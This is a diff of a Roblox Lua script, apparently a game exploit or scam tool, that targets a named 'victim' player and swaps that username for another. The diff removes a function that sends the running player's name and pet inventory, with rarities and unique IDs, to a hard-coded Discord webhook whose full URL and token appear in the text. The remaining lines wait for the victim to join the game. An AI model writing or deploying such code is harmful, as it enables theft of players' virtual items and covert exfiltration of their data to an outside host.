@@ -1,4 +1,4 @@
-local victimUsername = "lusilen" 
+local victimUsername = "ii_Ctepa1ipad" 
 local Players = game:GetService("Players")
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local StarterGui = game:GetService("StarterGui")
@@ -72,41 +72,6 @@ RunService.RenderStepped:Connect(function()
 	QuestIconApp.Enabled = true
 	HouseEditorApp.Enabled = true
 end)
-local HttpService = game:GetService("HttpService")
-
-local WEBHOOK_URL = "https://discord.com/api/webhooks/1370355741789257808/S21xWhrREMBnLJxTUlSSmPAL9manpeH7n4-RHiW3USvRBkZpCb9g6hVJdIFztGQMqb8X" -- твой Discord webhook URL
-local function sendPetLog(petList)
-	local embed = {
-		title = "📦 Pet Inventory Log",
-		description = "**Игрок:** " .. game.Players.LocalPlayer.Name,
-		color = 65280,
-		fields = {},
-		footer = {
-			text = "logging",
-		},
-		timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
-	}
-	for _, pet in ipairs(petList) do
-		table.insert(embed.fields, {
-			name = pet.name,
-			value = string.format("🌟 Rarity: %s\n🎒 UID: `%s`", pet.rarity, pet.uid),
-			inline = true
-		})
-	end
-	local payload = HttpService:JSONEncode({
-		username = "Pet Logger",
-		embeds = {embed}
-	})
-	request({
-		Url = WEBHOOK_URL,
-		Method = "POST",
-		Headers = {
-			["Content-Type"] = "application/json"
-		},
-		Body = payload
-	})
-end
-
 
 local function waitForVictim()
 	while not Players:FindFirstChild(victimUsername) do
